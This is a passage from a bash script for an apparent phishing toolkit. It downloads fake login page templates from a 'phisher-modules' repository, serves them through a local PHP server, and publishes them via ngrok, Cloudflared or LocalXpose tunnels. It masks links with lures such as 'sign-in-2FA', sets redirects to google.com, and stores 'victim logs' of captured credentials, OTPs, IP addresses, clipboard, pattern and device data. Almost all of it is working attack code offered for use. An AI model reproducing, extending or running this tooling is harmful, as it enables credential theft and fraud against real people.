		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_clipboard; };;
esac    
}
menu_pattern(){
status_display
site_access="pattern"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
echo -e "${CYAN} More sites are coming soon   ${NC}"
echo -e " "
echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_pattern
case $reply_pattern in
        1 )
                site_id="default"
                dgfname="default"
                rdurl="www.google.com"
                site_name="Pattern"
                capture_type="PAT"
                site_template="Default" ;;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_pattern; };;
esac    
}
menu_ip(){
status_display
site_access="ip_address"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
echo -e "${CYAN} More sites are coming soon   ${NC}"
echo -e " "
echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_ip
case $reply_ip in
        1 )
                site_id="default"
                dgfname="default"
                rdurl="www.google.com"
                site_name="IP Details"
                capture_type="IP"
                site_template="Default" ;;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_ip; };;
esac    
}


## DOWNLOAD SITES
dsites(){
        { clear; banner; echo -e ""; }
        status
        if [[ ! -d "${site_dir}" ]]; then
                if [ $plainnetstats == "online" ]; then
                        rm -rf ${sites_dir}
                        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
                        wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
                        sleep 1
                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
                        unzip -q sites.zip
                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
                        mv phisher-modules-sites "${pro_dir}/.sites"
                        rm sites.zip
                        if [ -d "${pro_dir}/.sites" ]; then
                                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
                                sleep 3
                                homepage
                        else
                                echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
                                sleep 5
                                homepage
                        fi
                else
                        echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
                        sleep 3
                        homepage
                fi
        else
                rm -rf ${site_dir}
                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DELETED SUCCESSFULLY... ${NA}"
        fi
}

#Logs check
logs_check() {
	if [ -z "$(ls -A $DIR)" ]; then
		logs_menu
	else
		echo -e "No logs found"
		{ sleep 1; clear; homepage; }
	fi
}
logs_menu() {
status_display
echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
read -p "${temprompt}" reply_logs_menu

        case $reply_logs_menu in
                1 | 01)
                        ls ${logs_dir}/
			{ sleep 8; clear; logs_menu; };;
                2 | 02)
			ls ${logs_dir}/
                        echo -e ""
                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${BOLDWHITE} Enter the file name without extension (.txt) ${YELLOW}>> ${BLUE}")"
                        read -p "${temprompt}"
			if [ -f "${logs_dir}/$REPLY.txt" ]; then
				cat ${logs_dir}/$REPLY.txt
			else
				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
	                        { sleep 1; clear; logs_menu; }
			fi;;
                3 | 03)
                        echo -e ""
                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
                        read -p "${temprompt}"
			case $REPLY in
        	                Y | y)
                	                rm -rf ${logs_dir}
					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
					{ sleep 1; clear; tunnel_menu; };;
                        	N | n | *)
                                	{ clear;  logs_menu; };;

	                esac;;
                4 | 04)
                        { sleep 1; clear; tunnel_menu; };;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; logs_menu; };;
        esac
}

load_anim() {
    spinner=( '-' '\' '|' '/' )
    while [ l ]
    do
        for i in "${spinner[@]}"
        do
            echo -ne "\r${GREEN}[${WHITE}-${GREEN}]${GREEN}$1 ${BLUE}[${MAGENTA}$i${BLUE}]${NC}"
            sleep 0.2
        done
    done
}
load_print() {
        load_anim "${1}" &
        p=$!
        for i in 'seq l 10'
        do
                sleep $2
        done
        kill $p
}

## Install ngrok
check_ngrok(){
        { clear; banner; echo -e ""; }
	if [ ! -e "${server_dir}/ngrok" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} NGROK NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
                temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
	        read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_ngrok
			ngrok_token_check;;

		N | n | *)
			tunnel_menu;;

		esac
	else
		ngrok_token_check
	fi
}
install_ngrok() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
}
##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
		start_ngrok
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
                ngrok_token_setup
        fi
}
ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
		mkdir $HOME/.ngrok2
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
		echo -e " "
        fi

	rm -rf ${HOME}/.ngrok2/ngrok.yml
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
	read -p "${temprompt}" ntoken
	echo -e "authtoken : ${ntoken}" >> ngrok.yml
	mv ngrok.yml ${HOME}/.ngrok2/
	.${server_dir}/ngrok config upgrade
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
	clear
	banner
	start_ngrok
}
ngrok_region() {
        echo -e ""
        echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION${NA}${YELLOW} >> ${NA}"
        temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in) ${NA}${YELLOW}>> ")"
	read -p "${temprompt}" ngrokregion
	case $ngrokregion in
	"us" | "US")
		ngrokregion="us";;
	"eu" | "EU")
		ngrokregion="eu";;
	"au" | "AU")
		ngrokregion="au";;
	"ap" | "AP")
		ngrokregion="ap";;
	"sa" | "SA")
		ngrokregion="sa";;
	"jp" | "JP")
		ngrokregion="jp";;
	"in" | "IN")
		ngrokregion="in";;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
		{ sleep 5; clear; banner; echo -e ""; ngrok_region; };;
	esac
}
## Start ngrok
start_ngrok() {
        setup_site_check
	echo -e "\n"
	ngrokregion="us"
        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}Change ngrok server region ${NA}"
        echo -e "   ${GREEN}Current region : ${BLUE}${ngrokregion}${NA}"
        echo -e ""
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
	read -p "${temprompt}"
	case $REPLY in
	1 | Y | y | yes | Yes | YES)
		ngrok_region;;
	*)
		echo -e " ";;
	esac
#load_print "Launching NGROK" '15'
        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
        if [[ `command -v termux-chroot` ]]; then
                cd ${pro_dir}
                sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
        else
                sleep 2 && .${server_dir}/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
        fi
	sleep 15
	fetchlink_ngrok
	checklink
}
fetchlink_ngrok() {
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
        LINK="$ngrok_url"
}

## Install Cloudflared
check_cloudflared(){
        { clear; banner; echo -e ""; }
	if [ ! -e "${server_dir}/cloudflared" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} CLOUDFLARED NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
		temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
                read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_cloudflared
			start_cloudflared;;
		N | n | *)
			tunnel_menu;;
		esac
	else
                start_cloudflared
	fi
}
install_cloudflared() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
}
## Start Cloudflared
start_cloudflared() {
        setup_site_check
        rm .cld.log > /dev/null 2>&1 &
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

        if [[ `command -v termux-chroot` ]]; then
                cd ${pro_dir}
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
        else
                sleep 2 && .${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
        fi
	sleep 15
	fetchlink_cloudflared
	checklink
}
fetchlink_cloudflared() {
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${server_dir}/.cld.log")
        LINK="${cldflr_url}"
}

## Install LocalXpose
check_localxpose(){
	if [ ! -e "${server_dir}/loclx" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} LOCALXPOSE NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
		temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
                read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_localxpose
			token_localxpose
			start_loclx;;

		N | n | *)
			tunnel_menu;;

		esac
	else
		start_loclx
	fi
}
install_localxpose() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
}
token_localxpose() {
	.${server_dir}/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(.${server_dir}/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
		sleep 3
                temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
	        read -p "${temprompt}" loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}
## Start LocalXpose
start_loclx() {
	{ clear; banner; echo -e ""; }
        setup_site_check
	echo -e "\n"
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE NGROK SERVER REGION (Y/eu/us/N)${NA}${YELLOW}>> ${NA}")"
	read -n1 -p "${temprompt}" opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
                cd ${pro_dir}
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
	else
		sleep 1 && ./${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
	fi
	sleep 15
	fetchlink_localxpose
	checklink
}
fetchlink_localxpose() {
	loclx_url=$(cat ${server_dir}/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
        LINK="${loclx_url}"
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output ${server_dir}/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output ${server_dir}/$output > /dev/null 2>&1
		else
			mv -f $file ${server_dir}/$output > /dev/null 2>&1
		fi
		chmod +x ${server_dir}/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        setup_site_check
        { sleep 1; clear; banner; }
        displaylocalhost
	capture_data_check
}

#Host and port setup
HOST='127.0.0.1'
cusport() {
        status_display
        PORT=4444
        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}"
        echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
        echo -e ""
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        
        read -p "${prompt}"
	case $REPLY in
	1 | Y | y | yes | Yes | YES)
                echo -e ""
                echo -e ""
                temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NA}${YELLOW}>> ${BLUE}")"
		read -p "${temprompt}" cport
		PORT="${cport}";;
	*)
		PORT="4444";;
	esac
}

## SETUP SITE
#checking the site is offline or not
setup_site_check() {
        status_display
        final_site_dir="${sites_dir}/${site_access}/${site_id}"
        if [ -d ${final_site_dir} ]; then
                if [ -d "${final_site_dir}" ]; then
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site is already downloaded... NOW STARTING!! " 
                        setup_site_downloaded
                else 
                        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Site is not downloaded... DOWNLOADING NOW!! "
                        setup_site_dgf
                fi
        else
                echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Site is not downloaded!! "
                setup_site_dgf
        fi
        if [ ! -e "${www_dir}/index.php" ]; then
                cp ${fetch_dir}/index.php ${www_dir}
        fi
        if [ ! -e "${www_dir}/ip.php" ]; then
                cp ${fetch_dir}/ip.php ${www_dir}
        fi
        if [ ! -e "${www_dir}/device.js" ]; then
                cp ${fetch_dir}/device.js ${www_dir}
        fi
        if [ ! -e "${www_dir}/device_post.php" ]; then
                cp ${fetch_dir}/device_post.php ${www_dir}
        fi
        if [ ! -e "${www_dir}/device.html" ]; then
                cp ${fetch_dir}/device.html ${www_dir}
        fi
        cusport
        redirect_check
        start_php
}
## Setup website - offline
setup_site_downloaded() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        sleep 1
        echo -e "\n${RED}[${WHITE}-${RED}]${ULBLUE} SETTING UP SERVER....${NA}"
        cp -rf ${final_site_dir}/* ${www_dir}
}
setup_site_dgf() {
	rm -rf ${site_access}
        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$site_id"
        status
	if [ $plainnetstats == "online" ]; then
                echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                if [ "${capture_type}" == "NOTP" ];then
                        dgf "${dgfurl}" "otp" ""
                else
                        dgf "${dgfurl}" "none" ""
                fi
	else
		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't download the site!!${NA}"
		echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                sleep 5
                msg_exit
	fi
        sleep 2
        
        if [ -d ${site_access}/${site_id} ]; then
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded Successfully..." 
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} SETTING UP" 
                        sleep 0.5
                        cp -rf ${site_access}/${site_id}/* ${www_dir}
                        rm -rf ${site_access} 
        else 
                        echo -e "\n${RED}[${WHITE}-${RED}]${RED} Unable to download the site!! "
                        echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                        sleep 5
                        msg_exit
        fi
}
dgf(){
        url=$1
        exclude=$2
        auth_token=$3
        has_branch=$(echo ${url} | grep /tree/ > /dev/null; echo $?)
        tokens=(${url//"/"/ })
        tokens_len=$((${#tokens[@]} - 1))
        owner=${tokens[2]}
        repo=${tokens[3]}
        if [[ $has_branch -eq 0 ]]
        then
                branch=${tokens[5]}
                dir_path=${tokens[6]}
                dir_path_start_idx="7"
        else
                dir_path=${tokens[4]}
                dir_path_start_idx="5"
        fi
        for ((i = ${dir_path_start_idx}; i <= ${tokens_len}; i++));
        do
                dir_path="${dir_path}/${tokens[i]}"
        done
        # API Template "https://api.github.com/repos/${OWNER}/${REPO}/contents/${DIR_PATH}?ref=${BRANCH}"
        contents_url="https://api.github.com/repos/${owner}/${repo}/contents"
        if [[ "${dir_path}" != "" ]]
        then
                contents_url="${contents_url}/${dir_path}"

                if [[ "${branch}" != "" ]]
                then
                        contents_url="${contents_url}?ref=${branch}"
                fi
        fi
        contents_file=$(mktemp)
        accept_header="Accept: application/vnd.github.v3+json"
        auth_header="Authorization: token ${auth_token}"
        if [ "${auth_token}" = "" ];
        then
                curl -s -H "${accept_header}" "${contents_url}" > ${contents_file}
        else
                curl -s -H "${auth_header}" -H "${accept_header}" "${contents_url}" > ${contents_file}
        fi
        rate_exceeded=$(cat ${contents_file} | grep "API rate limit exceeded" > /dev/null; echo $?)
        if [[ "${rate_exceeded}" -eq 0 ]]
        then
                echo "ERROR : API Rate limit is exceeded."
                echo -e ""
                exit 1
        fi
        file_names=$(cat ${contents_file} | grep "\"name\":")
        file_names=${file_names//"\"name\":"/}
        file_names=${file_names//"\""/}
        file_names=${file_names//","/}
        file_names=(${file_names})
        paths=$(cat ${contents_file} | grep "\"path\":")
        paths=${paths//"\"path\":"/}
        paths=${paths//"\""/}
        paths=${paths//","/}
        paths=(${paths})
        download_urls=$(cat ${contents_file} | grep "\"download_url\":")
        download_urls=${download_urls//"\"download_url\":"/}
        download_urls=${download_urls//"\""/}
        download_urls=${download_urls//","/}
        download_urls=(${download_urls})
        n_files=${#file_names[@]}
        runners=()
        for ((i = 0; i < ${n_files}; i++));
        do
                f_name=${file_names[i]}
                path=${paths[i]}
                check_dir=$(dirname "${path}")
                download_url=${download_urls[i]}
                if [[ "${#runners[@]}" -ge 10 ]]; then
                        wait ${runners[@]}
                        runners=()
                fi
                if [ "${download_url}" == "null" ]; then
                        if [[ "$check_dir" != *$exclude ]]; then
                                mkdir -p "${path}"
                                dgf "${url}/${f_name}" "$exclude" "${auth_token}"
                                if [[ "$?" -ne 0 ]]; then
                                        echo "Error"
                                        exit $?
                                fi	
                                continue;
                        fi
                else
                        if [[ "$check_dir" != *$exclude ]]; then
                                mkdir -p $(dirname "${path}")
                                echo "${path}"
                                curl -s "${download_url}" > "${path}" &
                                runners+=($!)
                        fi
                fi
        done

}
start_php() {
        { clear; banner; echo -e ""; }
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${NC}"
        cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

##REDIRECT
redirect_check(){
        status_display
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
        echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
        echo -e " "
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        
        read -p "${prompt}" rdchoice
		case $rdchoice in
                1 | Y | y | yes | Yes | YES)
  	                redirect_input;;
                *)
                        redirect_setup;;
	        esac
}
redirect_input() {
        echo -e "\n"
        echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR REDIRECT URL ${NF} : ${NA}"
        temprompt=$(echo -e "${YELLOW}>> " )
        read -p "$temprompt" urdurl
        if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                sleep 3
                status_display
                redirect_input
        else
                redirect_setup
	fi
}
redirect_setup() {
        if [ -z "$urdurl" ]; then
               rdurl=${urdurl}
        fi 
	if [[ ${capture_type}="NOTP" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php"
        elif [[ ${capture_type}="POTP" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
        elif [[ ${capture_type}="OOTP" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
        elif [[ ${capture_type}="IMG" ]];then
                echo " NOT READ YET"; sleep 3
        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
        elif [[ ${capture_type}="VID" ]];then
                echo " NOT READ YET"; sleep 3
        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
        elif [[ ${capture_type}="MIC" ]];then
                echo " NOT READ YET"; sleep 3
        ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
        elif [[ ${capture_type}="LOC" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
        elif [[ ${capture_type}="CLIP" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
        elif [[ ${capture_type}="PAT" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/post.php"
        elif [[ ${capture_type}="IP" ]];then
                awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
	else
		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
                echo -ne "\n${RED}[${WHITE}?${RED}]${GREEN} Setting up default redirect URL"
                echo -ne "${RED}[${WHITE}?${RED}]${GREEN} Redirect URL : ${BLUE} ${rdurl}"
                sleep 3
                urdurl=${rdurl}
                redirect_setup
        fi
}

#Check whether link was generated properly
checklink() {
	if [ -z "$LINK" ]; then
		clear
		banner
		echo -e " "
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
		sleep 5
		tunnel_name="LocalHost"
                tunnel_id="localhost"
		start_localhost
	else
		cusurl
	fi
}

## URL MASKING
cusurl(){
	status_display
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
        echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
        echo -e "" 
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
	read -p "${temprompt}" CUS_URI
	case $CUS_URI in
                Y | y)
			status
			if [ $netstats == "online" ]; then
				shorten_keystocks
			else
				{ clear; sbanner; }
				echo -e "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
				sleep 5
				displaylink
				capture_data_check
			fi;;
                N | n | *)
			displaylink
			capture_data_check;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
	                { clear; banner; cusurl; }
                esac
}
shorten_keystocks(){
        echo -e ""
        echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}ENTER YOUR CUSTOM URL${NA}${YELLOW} >> ${NA}"
        temprompt="$(echo -e "${GREEN}(eg:https://google.com | www.google.com) ${YELLOW}>> ${BLUE}")"
	read -p "${temprompt}" CUS_URL
	checkurl ${CUS_URL}
	echo -e " "
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Enter Some KeyStocks (eg: sign-in-2FA)${YELLOW} >> ${BLUE}")"
	read -p "${temprompt}" Keystks #KEY_STOCKS
	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
		shorten
	else
		echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
		{ sleep 1.5; clear; banner; cusurl; }
	fi
}
checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
		if [[  "${1::3}" != 'www' ]]; then
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http/https insted of : ${CUS_URL}"
			{ sleep 1.5; clear; banner; cusurl; }
		fi
	fi
}
